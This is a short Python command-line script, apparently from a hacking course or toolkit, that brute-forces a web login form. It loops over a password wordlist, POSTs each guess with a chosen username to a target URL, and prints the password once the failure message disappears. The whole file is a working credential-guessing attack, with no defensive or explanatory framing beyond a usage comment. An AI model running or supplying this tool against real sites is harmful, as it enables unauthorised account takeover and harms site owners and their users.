#!/usr/bin/env python
import argparse

import requests


# python guess_login.py -t https://some-site.com/login -u admin -d passwords.txt


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target domain")
    parser.add_argument("-u", "--username", dest="username", help="Username for guessing password")
    parser.add_argument("-d", "--dict-file", dest="dict_file", help="File with list of passwords")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target url, use --help for more info")
    if not options.username:
        parser.error("[-] Please specify a username for guessing password, use --help for more info")
    elif not options.dict_file:
        parser.error("[-] Please specify a file with list of passwords, use --help for more info")
    return options


def guess_login(target_url, dict_file):
    with open(dict_file, "r") as word_list_file:
        for line in word_list_file:
            word = line.strip()
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)
            if "Invalid username or password" not in response.content.decode():
                print("[+] Got the password --> " + word)
                exit()


options = get_arguments()

data_dict = {"username": options.username, "password": "", "Login": "submit"}
guess_login(options.target, options.dict_file)
print("[-] Reached end of dict")
